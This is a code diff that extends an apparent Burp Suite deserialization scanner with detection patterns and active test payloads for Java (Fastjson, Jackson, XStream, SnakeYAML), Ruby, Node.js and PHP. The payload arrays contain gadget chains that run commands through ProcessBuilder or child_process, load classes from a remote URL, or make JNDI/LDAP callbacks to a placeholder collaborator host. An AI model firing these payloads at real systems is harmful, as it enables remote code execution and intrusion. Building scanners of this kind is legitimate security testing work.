@@ -94,6 +94,44 @@ public class DeserializationScanner implements ScanModule {
     private static final Pattern PYTHON_YAML_UNSAFE = Pattern.compile(
             "(?i)yaml\\.load\\(|yaml\\.unsafe_load|!!python/object");
     private static final Pattern PYTHON_MARSHAL = Pattern.compile("(?i)marshal\\.loads");
+    private static final Pattern PYTHON_JSONPICKLE = Pattern.compile("\"py/reduce\"|\"py/object\"|\"py/function\"");
+
+    // Ruby serialization indicators
+    private static final Pattern RUBY_MARSHAL_B64 = Pattern.compile("BAh[bijIiUlxmc0NTYWVv][A-Za-z0-9+/=]");
+    private static final Pattern RUBY_MARSHAL_HEX = Pattern.compile("(?i)04\\s*08");
+    private static final Pattern RUBY_YAML_UNSAFE = Pattern.compile(
+            "!!ruby/object:|!!ruby/hash:|!!ruby/struct:|!!ruby/class:|!!ruby/module:|!!ruby/regexp:");
+    private static final Pattern RUBY_ERB_TAGS = Pattern.compile("<%=?\\s*.*%>");
+    private static final Set<String> RUBY_VULN_GEMS = Set.of(
+            "marshal.load", "yaml.load", "yaml.unsafe_load", "psych",
+            "drb/drb", "active_support", "rails", "rack.session",
+            "devise", "warden", "ruby_marshal"
+    );
+
+    // Node.js serialization indicators
+    private static final Pattern NODE_SERIALIZE = Pattern.compile("_\\$\\$ND_FUNC\\$\\$_");
+    private static final Pattern NODE_CRYO = Pattern.compile("\"__cryo_type__\"\\s*:");
+    private static final Pattern NODE_JS_YAML = Pattern.compile("!!js/function|!!js/undefined|tag:yaml\\.org,2002:js/");
+    private static final Pattern NODE_FUNCSTER = Pattern.compile("\"__js_function\"\\s*:");
+    private static final Pattern NODE_SERIALIZE_IIFE = Pattern.compile("_\\$\\$ND_FUNC\\$\\$_function\\s*\\(");
+
+    // Java sub-framework patterns — Fastjson, Jackson, XStream, SnakeYAML, Kryo, Hessian
+    private static final Pattern JAVA_FASTJSON_TYPE = Pattern.compile("\"@type\"\\s*:\\s*\"[a-zA-Z]");
+    private static final Pattern JAVA_JACKSON_POLY = Pattern.compile(
+            "\\[\\s*\"[a-z][a-z0-9_.]*\\.[A-Z][A-Za-z0-9$]+\"\\s*,\\s*\\{");
+    private static final Pattern JAVA_JACKSON_DEFAULT_TYPING = Pattern.compile(
+            "(?i)DefaultTyping|enableDefaultTyping|activateDefaultTyping|PolymorphicTypeValidator");
+    private static final Pattern JAVA_XSTREAM_XML = Pattern.compile(
+            "<(?:java\\.util\\.|sorted-set|dynamic-proxy|tree-map|linked-hash-set"
+                    + "|java\\.lang\\.ProcessBuilder|javax\\.naming|com\\.sun\\.rowset)");
+    private static final Pattern JAVA_SNAKEYAML_TAG = Pattern.compile(
+            "!!javax\\.script|!!com\\.sun\\.|!!java\\.net\\.|!!org\\.apache\\."
+                    + "|!!org\\.springframework|!!java\\.lang\\.ProcessBuilder"
+                    + "|!!javax\\.management|!!com\\.mchange");
+    private static final Pattern JAVA_KRYO_B64 = Pattern.compile("AQ[A-Za-z0-9+/=]{10,}");
+    private static final Pattern JAVA_HESSIAN_MAGIC = Pattern.compile("(?i)^[HhCcMm]\\x02\\x00");
+    private static final Pattern JAVA_HESSIAN_CONTENT_TYPE = Pattern.compile(
+            "(?i)application/x-hessian|application/x-burlap|x-application/hessian");
 
     // Known serialization headers
     private static final Set<String> SERIALIZATION_CONTENT_TYPES = Set.of(
@@ -116,7 +154,12 @@ public class DeserializationScanner implements ScanModule {
             "__session", "data", "state", "object", "payload", "s",
             "flask_session", "connect.sid", "express.sid", "koa.sess",
             "koa:sess", "play_session", "rack.session", "_rails_session",
-            "sid", "ssid", "serialized"
+            "sid", "ssid", "serialized",
+            // Ruby specific
+            "_session_id", "_myapp_session", "remember_token", "auth_token",
+            "marshal_data", "_session",
+            // Node.js specific
+            "session.sig", "io", "socketio", "node_session"
     );
 
     // ==================== ACTIVE TESTING PAYLOADS ====================
@@ -140,6 +183,77 @@ public class DeserializationScanner implements ScanModule {
             {"Jdk7u21", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldIpEhZWWuLc0AwAAeHB3DAAAAL"},
             {"Vaadin1", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rv"},
             {"Click1", "rO0ABXNyAC5vcmcuYXBhY2hlLmNsaWNrLmNvbnRyb2wuQ29sdW1uJENvbHVtblNvcnQ="},
+    };
+
+    // Java sub-framework active payloads — Fastjson, Jackson, XStream, SnakeYAML
+    private static final String[][] JAVA_FASTJSON_PAYLOADS = {
+            {"Fastjson JdbcRowSetImpl",
+                    "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}"},
+            {"Fastjson TemplatesImpl",
+                    "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"PAYLOAD\"],\"_name\":\"a\",\"_tfactory\":{},\"_outputProperties\":{}}"},
+            {"Fastjson BasicDataSource",
+                    "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"com.sun.rowset.JdbcRowSetImpl\",\"url\":\"ldap://COLLAB_PLACEHOLDER/b\"}"},
+            {"Fastjson JndiDataSourceFactory",
+                    "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://COLLAB_PLACEHOLDER/c\"}}"},
+            {"Fastjson UnixPrintService",
+                    "{\"@type\":\"sun.print.UnixPrintServiceLookup\",\"defaultPrinter\":\"nslookup COLLAB_PLACEHOLDER\"}"},
+            {"Fastjson 1.2.68+ expectClass",
+                    "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/d\",\"autoCommit\":true}"},
+            {"Fastjson LdapAttribute",
+                    "{\"@type\":\"com.sun.jndi.ldap.LdapAttribute\",\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.net.URL\",\"val\":\"http://COLLAB_PLACEHOLDER/e\"}}"},
+    };
+
+    private static final String[][] JAVA_JACKSON_PAYLOADS = {
+            {"Jackson JdbcRowSetImpl",
+                    "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://COLLAB_PLACEHOLDER/a\",\"autoCommit\":true}]"},
+            {"Jackson TemplatesImpl",
+                    "[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"PAYLOAD\"],\"transletName\":\"a\",\"outputProperties\":{}}]"},
+            {"Jackson C3P0 JNDI",
+                    "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"ldap://COLLAB_PLACEHOLDER/b\",\"loginTimeout\":0}]"},
+            {"Jackson SpringAbstractBeanFactory",
+                    "[\"org.springframework.beans.factory.config.PropertyPathFactoryBean\",{\"targetBeanName\":\"ldap://COLLAB_PLACEHOLDER/c\",\"propertyPath\":\"x\"}]"},
+            {"Jackson LogbackJndi",
+                    "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://COLLAB_PLACEHOLDER/d\"}]"},
+    };
+
+    private static final String[][] JAVA_XSTREAM_PAYLOADS = {
+            {"XStream ProcessBuilder",
+                    "<java.lang.ProcessBuilder><command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command></java.lang.ProcessBuilder>"},
+            {"XStream EventHandler",
+                    "<dynamic-proxy><interface>java.lang.Comparable</interface>"
+                            + "<handler class=\"java.beans.EventHandler\">"
+                            + "<target class=\"java.lang.ProcessBuilder\">"
+                            + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
+                            + "</target><action>start</action></handler></dynamic-proxy>"},
+            {"XStream SortedSet",
+                    "<sorted-set><string>foo</string>"
+                            + "<dynamic-proxy><interface>java.lang.Comparable</interface>"
+                            + "<handler class=\"java.beans.EventHandler\">"
+                            + "<target class=\"java.lang.ProcessBuilder\">"
+                            + "<command><string>nslookup</string><string>COLLAB_PLACEHOLDER</string></command>"
+                            + "</target><action>start</action></handler></dynamic-proxy></sorted-set>"},
+            {"XStream ImageIO",
+                    "<java.util.PriorityQueue serialization=\"custom\">"
+                            + "<unserializable-parents/><java.util.PriorityQueue>"
+                            + "<default><size>2</size></default><int>3</int>"
+                            + "<javax.imageio.ImageIO$ContainsFilter>"
+                            + "<method><class>java.lang.ProcessBuilder</class>"
+                            + "<name>start</name><parameter-types/></method>"
+                            + "<name>foo</name></javax.imageio.ImageIO$ContainsFilter>"
+                            + "<string>foo</string></java.util.PriorityQueue></java.util.PriorityQueue>"},
+    };
+
+    private static final String[][] JAVA_SNAKEYAML_PAYLOADS = {
+            {"SnakeYAML ScriptEngineManager",
+                    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLAB_PLACEHOLDER/yaml\"]]]]"},
+            {"SnakeYAML ProcessBuilder",
+                    "!!java.lang.ProcessBuilder [[\"nslookup\",\"COLLAB_PLACEHOLDER\"]]"},
+            {"SnakeYAML JdbcRowSet",
+                    "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://COLLAB_PLACEHOLDER/yaml', autoCommit: true}"},
+            {"SnakeYAML SpringPropertyPathFactory",
+                    "!!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: 'ldap://COLLAB_PLACEHOLDER/yaml', propertyPath: x}"},
+            {"SnakeYAML C3P0",
+                    "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource {jndiName: 'ldap://COLLAB_PLACEHOLDER/yaml', loginTimeout: 0}"},
     };
 
     // .NET deserialization payloads — error/behavior-based detection
@@ -328,19 +442,103 @@ public class DeserializationScanner implements ScanModule {
             {"PyYAML RCE", "ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzbGVlcCA1"},
     };
 
+    // Ruby deserialization payloads (Marshal.load / YAML.load gadget chains)
+    private static final String[][] RUBY_PAYLOADS = {
+            // Marshal.load payloads (Base64 encoded)
+            {"Ruby ERB template",
+                    "BAhvOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNz"
+                            + "WwdvOhpHZW06OlN0dWJTcGVjaWZpY2F0aW9uBjoJQG5hbWUiCXNsZWVw"},
+            {"Ruby Universal RCE chain",
+                    "BAhbCGMVR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRl"
+                            + "cGVuZGVuY3lMaXN0BzoLQHNwZWNzWwA="},
+            {"Ruby Gem::Installer",
+                    "BAhvOhVHZW06Okluc3RhbGxlcgY6CUBnZW1vOhpHZW06OlN0dWJTcGVjaWZpY2F0aW9u"},
+            {"Ruby Gem::Requirement",
+                    "BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0"},
+            // YAML-based payloads
+            {"Ruby YAML Gem::Installer",
+                    "LS0tICFydWJ5L29iamVjdDpHZW06Okluc3RhbGxlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpT"
+                            + "cGVjRmV0Y2hlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpSZXF1aXJlbWVudA=="},
+            {"Ruby YAML ERB",
+                    "LS0tICFydWJ5L29iamVjdDpFcmI6OlV0aWw6OkNhcHR1cmUKc3JjOiAiPCU9IHN5c3RlbSgn"
+                            + "c2xlZXAgNScpICU+Ig=="},
+            {"Ruby YAML Psych",
+                    "LS0tICFydWJ5L29iamVjdDpHZW06Okluc3RhbGxlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpT"
+                            + "dHViU3BlY2lmaWNhdGlvbgoJbmFtZTogc2xlZXA="},
+    };
+
+    // Node.js deserialization payloads
+    private static final String[][] NODEJS_PAYLOADS = {
+            // node-serialize IIFE payloads
+            {"node-serialize IIFE",
+                    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()\"}"},
+            {"node-serialize require",
+                    "{\"rce\":\"_$$ND_FUNC$$_function(){var net=require('net');var cp=require('child_process')}()\"}"},
+            // cryo deserialization
+            {"cryo prototype pollution",
+                    "{\"__cryo_type__\":\"Function\",\"body\":\"return require('child_process').execSync('sleep 5')\"}"},
+            // funcster deserialization
+            {"funcster RCE",
+                    "{\"__js_function\":\"function(){require('child_process').execSync('sleep 5')}\"}"},
+            // js-yaml !!js/function
+            {"js-yaml function",
+                    "!!js/function 'function(){require(\"child_process\").execSync(\"sleep 5\")}'"},
+            // node-serialize with Buffer
+            {"node-serialize Buffer",
+                    "{\"rce\":\"_$$ND_FUNC$$_function(){Buffer.from(require('child_process').execSync('id'))}()\"}"},
+            // Prototype pollution leading to RCE
+            {"constructor.prototype",
+                    "{\"__proto__\":{\"type\":\"Code\",\"value\":\"require('child_process').execSync('sleep 5')\"}}"},
+            {"constructor pollution",
+                    "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('sleep 5');x\"}}}"},
+    };
+
+    // Additional PHP framework chains
+    private static final String[][] PHP_FRAMEWORK_PAYLOADS = {
+            // Joomla chain
+            {"Joomla RCE", "O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:54:\"eval(base64_decode('cGhwaW5mbygpOw=='));JFactory::getConfig();exit\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}"},
+            // PrestaShop chain
+            {"PrestaShop chain", "O:26:\"Smarty_Internal_Template\":1:{s:5:\"cache\";O:36:\"Smarty_Internal_CacheResource_File\":1:{s:5:\"valid\";b:0;}}"},
+            // PHPMailer object injection
+            {"PHPMailer RCE", "O:9:\"PHPMailer\":1:{s:17:\"\\0PHPMailer\\0Mailer\";s:8:\"sendmail\";s:13:\"\\0PHPMailer\\0LE\";s:1:\"'\";s:22:\"\\0PHPMailer\\0Sendmail\";s:26:\"/usr/sbin/sendmail -t -i\";}"},
+            // Phalcon chain
+            {"Phalcon chain", "O:27:\"Phalcon\\Mvc\\Model\\Row\":1:{s:4:\"data\";a:1:{s:2:\"id\";s:11:\"/etc/passwd\";}}"},
+            // Zend Framework chain
+            {"Zend Framework", "O:30:\"Zend_Log_Writer_Mail\":1:{s:16:\"\\0*\\0_eventsToMail\";a:1:{i:0;s:6:\"system\";}}"},
+            // FuelPHP chain
+            {"FuelPHP chain", "O:27:\"Fuel\\Core\\Autoloader\":1:{s:8:\"\\0*\\0paths\";a:1:{s:4:\"test\";s:11:\"/etc/passwd\";}}"},
+            // phpBB chain
+            {"phpBB chain", "O:15:\"phpbb\\db\\driver\":1:{s:11:\"\\0*\\0sql_layer\";s:6:\"system\";}"},
+            // Contao chain
+            {"Contao chain", "O:29:\"Contao\\CoreBundle\\Routing\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"},
+            // SugarCRM chain
+            {"SugarCRM chain", "O:28:\"SugarBean\\Person\\Employee\":1:{s:8:\"\\0*\\0table\";s:6:\"system\";}"},
+            // MediaWiki chain
+            {"MediaWiki chain", "O:12:\"ArrayObject\":1:{i:0;O:12:\"MWException\":1:{s:4:\"text\";s:4:\"test\";}}"},
+            // TCPDF chain
+            {"TCPDF chain", "O:5:\"TCPDF\":1:{s:8:\"\\0*\\0file\";s:11:\"/etc/passwd\";}"},
+    };
+
     public static class DeserPoint {
         public final String location; // cookie, header, param, body
         public final String name;
         public final String value;
         public final String language; // Java, .NET, PHP, Python
         public final String indicator; // what triggered detection
+        public final String encoding; // "none", "base64", "base64url" — tells active testing how to wrap payloads
 
         public DeserPoint(String location, String name, String value, String language, String indicator) {
+            this(location, name, value, language, indicator, "none");
+        }
+
+        public DeserPoint(String location, String name, String value, String language,
+                           String indicator, String encoding) {
             this.location = location;
             this.name = name;
             this.value = value;
             this.language = language;
             this.indicator = indicator;
+            this.encoding = encoding;
         }
     }
 
@@ -352,7 +550,11 @@ public class DeserializationScanner implements ScanModule {
 
     @Override
     public String getDescription() {
-        return "Insecure deserialization detection for Java, .NET, PHP, and Python with passive analysis and active gadget-chain testing.";
+        return "Insecure deserialization detection for Java (core, Fastjson, Jackson, XStream, SnakeYAML, Kryo, Hessian), "
+                + ".NET (BinaryFormatter, JSON.NET, ViewState, XAML, SOAP), PHP (Laravel, Symfony, WordPress, Magento, Yii2, "
+                + "Joomla, Drupal, CakePHP, ThinkPHP, CodeIgniter, Monolog, Guzzle), Python (pickle, PyYAML, jsonpickle), "
+                + "Ruby (Marshal, YAML/Psych), and Node.js (node-serialize, cryo, funcster, js-yaml). "
+                + "Scans headers, cookies, parameters, and raw body — both raw and base64-encoded.";
     }
 
     @Override
@@ -406,20 +608,34 @@ public class DeserializationScanner implements ScanModule {
             }
         }
 
-        return findings;
+        // Attach requestResponse to all passive findings so DashboardReporter
+        // can report them (it skips findings with null requestResponse).
+        List<Finding> enriched = new ArrayList<>(findings.size());
+        for (Finding f : findings) {
+            if (f.getRequestResponse() == null) {
+                enriched.add(Finding.builder(f.getModuleId(), f.getTitle(), f.getSeverity(), f.getConfidence())
+                        .url(f.getUrl()).parameter(f.getParameter())
+                        .evidence(f.getEvidence()).description(f.getDescription())
+                        .remediation(f.getRemediation()).requestResponse(requestResponse)
+                        .build());
+            } else {
+                enriched.add(f);
+            }
+        }
+        return enriched;
     }
 
     // ==================== PASSIVE: REQUEST ANALYSIS ====================
 
     private void passiveAnalyzeRequest(HttpRequest request, String url,
                                         List<DeserPoint> deserPoints, List<Finding> findings) {
-        // Check cookies
+        // Check cookies — scan raw, URL-decoded, and base64-decoded with dedup
         for (var param : request.parameters()) {
             if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
                 String name = param.name().toLowerCase();
                 String value = param.value();
 
-                // Apache Shiro rememberMe
+                // Apache Shiro rememberMe — special-case (always a known target)
                 if (name.equals("rememberme") || name.equals("remember-me")) {
                     deserPoints.add(new DeserPoint("cookie", param.name(), value, "Java", "Shiro rememberMe cookie"));
                     findings.add(Finding.builder("deser-scanner",
@@ -432,35 +648,7 @@ public class DeserializationScanner implements ScanModule {
                             .build());
                 }
 
-                // Java serialized in cookie
-                if (JAVA_MAGIC_BYTES_B64.matcher(value).find()) {
-                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "Java", "Base64 Java serialized object"));
-                    reportPassiveFinding(findings, url, param.name(), "Java serialized object in cookie",
-                            "Java", "Base64-encoded Java serialized object (rO0AB prefix)");
-                }
-
-                // PHP serialized in cookie
-                if (PHP_SERIALIZED.matcher(value).find()) {
-                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "PHP", "PHP serialized string"));
-                    reportPassiveFinding(findings, url, param.name(), "PHP serialized data in cookie",
-                            "PHP", "PHP serialized object pattern (O:N: / a:N:)");
-                }
-
-                // Python pickle in cookie
-                if (PYTHON_PICKLE_B64.matcher(value).find()) {
-                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "Python", "Pickle object"));
-                    reportPassiveFinding(findings, url, param.name(), "Python pickle in cookie",
-                            "Python", "Base64-encoded pickle data (gASV prefix)");
-                }
-
-                // .NET BinaryFormatter in cookie (AAEAAAD///// prefix)
-                if (DOTNET_BINARY_B64.matcher(value).find()) {
-                    deserPoints.add(new DeserPoint("cookie", param.name(), value, ".NET", ".NET BinaryFormatter in cookie"));
-                    reportPassiveFinding(findings, url, param.name(), ".NET BinaryFormatter data in cookie",
-                            ".NET", "Base64-encoded .NET BinaryFormatter object (AAEAAAD///// prefix)");
-                }
-
-                // .NET session cookies (FedAuth, .AspNet.Cookies, etc.)
+                // .NET session cookies — special-case info finding
                 if (DOTNET_SESSION_COOKIE.matcher(name).find()) {
                     deserPoints.add(new DeserPoint("cookie", param.name(), value, ".NET", ".NET session cookie"));
                     findings.add(Finding.builder("deser-scanner",
@@ -472,6 +660,9 @@ public class DeserializationScanner implements ScanModule {
                                     + "(e.g., claims, tokens), it may be a deserialization target.")
                             .build());
                 }
+
+                // All-language pattern scan: raw → URL-decoded → base64-decoded (with dedup)
+                deserPoints.addAll(scanValueAllEncodings(value, "cookie", param.name(), url, findings));
             }
         }
 
@@ -485,16 +676,24 @@ public class DeserializationScanner implements ScanModule {
             }
         }
 
-        // Check request headers
+        // Check request headers — all languages, URL-decoded + base64 decoded (with dedup)
         for (var header : request.headers()) {
-            String name = header.name().toLowerCase();
+            String hname = header.name().toLowerCase();
             String value = header.value();
 
-            if (JAVA_MAGIC_BYTES_B64.matcher(value).find()) {
-                deserPoints.add(new DeserPoint("header", header.name(), value, "Java", "Java serialized in header"));
-                reportPassiveFinding(findings, url, header.name(), "Java serialized data in request header",
-                        "Java", "Base64 Java serialization in header: " + header.name());
-            }
+            // Skip standard browser headers that never contain serialized data
+            if (hname.equals("host") || hname.equals("user-agent") || hname.equals("accept")
+                    || hname.equals("accept-encoding") || hname.equals("accept-language")
+                    || hname.equals("connection") || hname.equals("content-type")
+                    || hname.equals("content-length") || hname.equals("referer")
+                    || hname.equals("origin") || hname.equals("if-modified-since")
+                    || hname.equals("if-none-match") || hname.equals("cache-control")
+                    || hname.startsWith("sec-fetch-") || hname.startsWith("sec-ch-")) continue;
+
+            if (value == null || value.isEmpty()) continue;
+
+            // All-language pattern scan: raw → URL-decoded → base64-decoded (with dedup)
+            deserPoints.addAll(scanValueAllEncodings(value, "header", header.name(), url, findings));
         }
 
         // Check raw body for .NET ViewState
@@ -516,37 +715,26 @@ public class DeserializationScanner implements ScanModule {
                 }
             }
         } catch (Exception ignored) {}
+
+        // ==================== RAW BODY SCANNING (all languages, raw + URL-decoded + base64) ====================
+        try {
+            String body = request.bodyToString();
+            if (body != null && body.length() > 2) {
+                // All-language pattern scan: raw → URL-decoded → base64-decoded (with dedup)
+                deserPoints.addAll(scanValueAllEncodings(body, "body", "__BODY__", url, findings));
+            }
+        } catch (Exception ignored) {}
     }
 
+    /**
+     * Checks a parameter value for deserialization patterns across all languages.
+     * Uses scanValueAllEncodings to check raw, URL-decoded, and base64-decoded forms
+     * with built-in deduplication (one finding per language per encoding).
+     */
     private void checkParamValue(String name, String value, String location, String url,
                                   List<DeserPoint> deserPoints, List<Finding> findings) {
         if (value == null || value.isEmpty()) return;
-
-        if (JAVA_MAGIC_BYTES_B64.matcher(value).find()) {
-            deserPoints.add(new DeserPoint(location, name, value, "Java", "Base64 Java object in param"));
-            reportPassiveFinding(findings, url, name, "Java serialized data in parameter", "Java",
-                    "Base64-encoded Java serialized object in parameter '" + name + "'");
-        }
-        if (PHP_SERIALIZED_FULL.matcher(value).find()) {
-            deserPoints.add(new DeserPoint(location, name, value, "PHP", "PHP serialized in param"));
-            reportPassiveFinding(findings, url, name, "PHP serialized data in parameter", "PHP",
-                    "PHP serialized object in parameter '" + name + "'");
-        }
-        if (PYTHON_PICKLE_B64.matcher(value).find()) {
-            deserPoints.add(new DeserPoint(location, name, value, "Python", "Pickle in param"));
-            reportPassiveFinding(findings, url, name, "Python pickle in parameter", "Python",
-                    "Base64-encoded pickle in parameter '" + name + "'");
-        }
-        if (DOTNET_BINARY_B64.matcher(value).find()) {
-            deserPoints.add(new DeserPoint(location, name, value, ".NET", ".NET BinaryFormatter in param"));
-            reportPassiveFinding(findings, url, name, ".NET BinaryFormatter data in parameter", ".NET",
-                    "Base64-encoded .NET BinaryFormatter object in parameter '" + name + "'");
-        }
-        if (DOTNET_DOLLAR_TYPE.matcher(value).find()) {
-            deserPoints.add(new DeserPoint(location, name, value, ".NET", "JSON.NET $type in param"));
-            reportPassiveFinding(findings, url, name, "JSON.NET $type polymorphic data in parameter", ".NET",
-                    "JSON with $type property detected in parameter '" + name + "' — indicates JSON.NET polymorphic deserialization");
-        }
+        deserPoints.addAll(scanValueAllEncodings(value, location, name, url, findings));
     }
 
     // ==================== PASSIVE: RESPONSE ANALYSIS ====================
@@ -708,7 +896,112 @@ public class DeserializationScanner implements ScanModule {
             }
         }
 
-        // Set-Cookie with serialized data
+        // Java Fastjson @type in response
+        if (JAVA_FASTJSON_TYPE.matcher(body).find()) {
+            findings.add(Finding.builder("deser-scanner",
+                            "Fastjson @type polymorphic deserialization in response",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("@type property found in JSON response body")
+                    .description("Fastjson @type property detected in response. The server uses Fastjson with "
+                            + "AutoType which allows type injection attacks. "
+                            + "Remediation: Upgrade Fastjson to latest version with safeMode or migrate to Gson/Jackson.")
+                    .build());
+        }
+
+        // Java Jackson DefaultTyping in response
+        if (JAVA_JACKSON_POLY.matcher(body).find()) {
+            findings.add(Finding.builder("deser-scanner",
+                            "Jackson polymorphic deserialization in response",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("Jackson polymorphic array pattern found in JSON response")
+                    .description("Jackson DefaultTyping pattern detected in response. The server uses Jackson "
+                            + "with polymorphic type handling which allows type injection attacks. "
+                            + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator.")
+                    .build());
+        }
+
+        // Java XStream XML in response
+        if (JAVA_XSTREAM_XML.matcher(body).find()) {
+            findings.add(Finding.builder("deser-scanner",
+                            "XStream XML serialization in response",
+                            Severity.MEDIUM, Confidence.FIRM)
+                    .url(url)
+                    .evidence("XStream XML serialization tags in response body")
+                    .description("XStream XML serialization detected in response. Older XStream versions "
+                            + "allow RCE via crafted XML. Remediation: Upgrade XStream and configure security framework.")
+                    .build());
+        }
+
+        // Ruby Marshal/YAML indicators in response
+        for (String gem : RUBY_VULN_GEMS) {
+            if (bodyLower.contains(gem)) {
+                findings.add(Finding.builder("deser-scanner",
+                                "Ruby serialization library reference: " + gem,
+                                Severity.INFO, Confidence.TENTATIVE)
+                        .url(url)
+                        .evidence("Ruby library '" + gem + "' referenced in response body")
+                        .description("Reference to Ruby library '" + gem + "' found. "
+                                + "If this library handles deserialization of untrusted data, it may be exploitable.")
+                        .build());
+                break;
+            }
+        }
+        if (RUBY_YAML_UNSAFE.matcher(body).find()) {
+            findings.add(Finding.builder("deser-scanner",
+                            "Ruby YAML unsafe object tags in response",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("!!ruby/object or similar YAML tag in response")
+                    .description("Ruby YAML object tags found in response. If YAML.load is used to deserialize "
+                            + "user-controlled data, this is exploitable for RCE. Use YAML.safe_load instead.")
+                    .build());
+        }
+
+        // Node.js serialization indicators in response
+        if (NODE_SERIALIZE.matcher(body).find() || NODE_CRYO.matcher(body).find()
+                || NODE_FUNCSTER.matcher(body).find()) {
+            findings.add(Finding.builder("deser-scanner",
+                            "Node.js serialization markers in response",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("Node.js serialization marker found in response body")
+                    .description("Node.js serialization library markers detected in response. "
+                            + "node-serialize and cryo are known to be vulnerable to RCE via crafted input. "
+                            + "Remediation: Replace with JSON.parse/JSON.stringify.")
+                    .build());
+        }
+
+        // Python jsonpickle in response
+        if (PYTHON_JSONPICKLE.matcher(body).find()) {
+            findings.add(Finding.builder("deser-scanner",
+                            "Python jsonpickle markers in response",
+                            Severity.HIGH, Confidence.FIRM)
+                    .url(url)
+                    .evidence("jsonpickle markers (py/reduce, py/object) found in response")
+                    .description("Python jsonpickle output detected in response. If jsonpickle.decode() is used "
+                            + "on user-controlled input, this leads to RCE. Use JSON instead.")
+                    .build());
+        }
+
+        // Hessian content-type in response
+        for (var header : response.headers()) {
+            if (header.name().equalsIgnoreCase("Content-Type")
+                    && JAVA_HESSIAN_CONTENT_TYPE.matcher(header.value()).find()) {
+                findings.add(Finding.builder("deser-scanner",
+                                "Java Hessian serialization in response",
+                                Severity.MEDIUM, Confidence.CERTAIN)
+                        .url(url)
+                        .evidence("Content-Type: " + header.value())
+                        .description("Hessian serialization protocol detected. Hessian can be exploited "
+                                + "via crafted objects. Remediation: Implement allowlist-based class filtering.")
+                        .build());
+                break;
+            }
+        }
+
+        // Set-Cookie with serialized data (all languages)
         for (var header : response.headers()) {
             if (header.name().equalsIgnoreCase("Set-Cookie")) {
                 String val = header.value();
@@ -720,6 +1013,34 @@ public class DeserializationScanner implements ScanModule {
                             .evidence("Set-Cookie contains Base64 Java serialized data")
                             .description("Server sets a cookie containing a Java serialized object. "
                                     + "If the cookie is deserialized on subsequent requests, this is exploitable.")
+                            .build());
+                }
+                if (RUBY_MARSHAL_B64.matcher(val).find()) {
+                    findings.add(Finding.builder("deser-scanner",
+                                    "Ruby Marshal object in Set-Cookie",
+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url)
+                            .evidence("Set-Cookie contains Base64-encoded Ruby Marshal data")
+                            .description("Server sets a cookie containing a Ruby Marshal object. "
+                                    + "If Marshal.load is used on this cookie, it is exploitable for RCE.")
+                            .build());
+                }
+                // Check decoded Set-Cookie for PHP serialized data
+                String cookieVal = val;
+                int eqIdx = val.indexOf('=');
+                if (eqIdx > 0) {
+                    int scIdx = val.indexOf(';', eqIdx);
+                    cookieVal = scIdx > 0 ? val.substring(eqIdx + 1, scIdx) : val.substring(eqIdx + 1);
+                }
+                String decoded = tryBase64Decode(cookieVal.trim());
+                if (decoded != null && PHP_SERIALIZED.matcher(decoded).find()) {
+                    findings.add(Finding.builder("deser-scanner",
+                                    "PHP serialized data in Set-Cookie (base64-encoded)",
